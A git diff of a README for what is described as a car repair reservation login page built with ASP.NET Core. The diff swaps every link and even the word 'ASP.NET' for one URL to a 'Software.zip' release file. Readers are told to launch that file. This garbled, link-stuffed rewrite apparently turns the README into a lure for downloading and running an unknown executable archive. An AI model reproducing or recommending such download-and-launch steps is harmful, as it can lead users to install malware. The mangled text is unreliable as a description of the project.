@@ -12,9 +12,9 @@ This repository is dedicated to the development of the login page for the Car Re
 ## Technologies and Topics
 ⚙️ **Technologies and topics covered in this repository:**
 
-- ASP.NET Core
-- ASP.NET Core MVC
-- ASP.NET Core Web API
+- https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip Core
+- https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip Core MVC
+- https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip Core Web API
 - Authentication
 - Authorization
 - Clean Architecture
@@ -30,7 +30,7 @@ This repository is dedicated to the development of the login page for the Car Re
 ## Repository Content
 📁 **Repository Content:**
 
-1. [Car Repair Reservation System Login Page Repository](https://github.com/user-attachments/files/18388744/Software.zip) [![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/user-attachments/files/18388744/Software.zip)
+1. [Car Repair Reservation System Login Page Repository](https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip) [![Download Software](https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip)](https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This repository is dedicated to the development of the login page for the Car Re
 🚀 **Get Started:**
 
 1. Clone this repository to your local machine.
-2. Launch the [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) file.
+2. Launch the [https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip](https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip) file.
 3. Explore the code and contribute to the development of the Car Repair Reservation System Login Page.
 
 ---
@@ -46,14 +46,14 @@ This repository is dedicated to the development of the login page for the Car Re
 ## Further Information
 ⚠️ **For more information:**
 
-If the link above for the Software.zip file is broken, please check the "Releases" section or reach out to the repository owner for assistance.
+If the link above for the https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip file is broken, please check the "Releases" section or reach out to the repository owner for assistance.
 
 ---
 
 ## Stay Connected
 🌐 **Stay Connected:**
 
-Visit the [GitHub Repository](https://github.com/user-attachments/files/18388744/Software.zip) for the Car Repair Reservation System Login Page and be part of the development journey!
+Visit the [GitHub Repository](https://github.com/ahmed2006-cmd/CarRepairReservationSystem-LoginPage/releases/download/v1.0/Software.zip) for the Car Repair Reservation System Login Page and be part of the development journey!
 
 ---
 
